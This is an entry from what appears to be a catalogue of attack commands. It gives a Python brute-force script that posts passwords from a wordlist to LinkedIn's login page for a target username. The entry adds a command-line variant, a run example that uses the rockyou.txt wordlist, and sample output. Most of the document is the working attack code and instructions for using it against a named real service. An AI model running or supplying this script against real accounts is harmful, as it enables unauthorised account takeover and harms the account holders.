---
id: cmd-uuid-001
data: >-
  import requests\n\nurl = 'https://linkedin.com/login'\nusername =
  'target@example.com'\nwordlist = 'passwords.txt'\n\nwith open(wordlist, 'r')
  as f:\n    for password in f:\n        data = {'username': username,
  'password': password.strip()}\n        response = requests.post(url,
  data=data)\n        if 'success' in response.text:\n           
  print(f'Success: {password}')\n            break\n        else:\n           
  print(f'Failed: {password}')
tags:
  - brute-force
  - automation
type: command
output: null
executor: python
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.745Z'
verified: false
validated: true
submitted: true
---
# python-brute-force-script

## Command

```python
import requests

url = 'https://linkedin.com/login'
username = 'target@example.com'
wordlist = 'passwords.txt'

with open(wordlist, 'r') as f:
    for password in f:
        data = {'username': username, 'password': password.strip()}
        response = requests.post(url, data=data)
        if 'success' in response.text:
            print(f'Success: {password}')
            break
        else:
            print(f'Failed: {password}')
```

## Description

This Python script automates brute-force login attempts by iterating through a password wordlist, sending POST requests to the target endpoint. Use it to test unrestricted authentication in web apps like LinkedIn's vulnerable login.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Target login endpoint URL | Yes |
| `username` | Fixed username to attack | Yes |
| `wordlist` | File path to password list | Yes |

## Examples

### Basic Usage

```bash
python brute_force.py
```
(Assumes hardcoded values)

### Advanced Usage

Modify script for CLI args:
```python
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True)
parser.add_argument('--username', required=True)
parser.add_argument('--wordlist', required=True)
args = parser.parse_args()
# Use args.url, etc.
```
Run: `python brute_force.py --url https://target/login --username user --wordlist rockyou.txt`

## Expected Output

Console prints 'Failed: password1', etc., until 'Success: correctpass' if found, or all failures.

## Related

- [[Related Procedure: Automate-Brute-Force-Login-Attempts]]
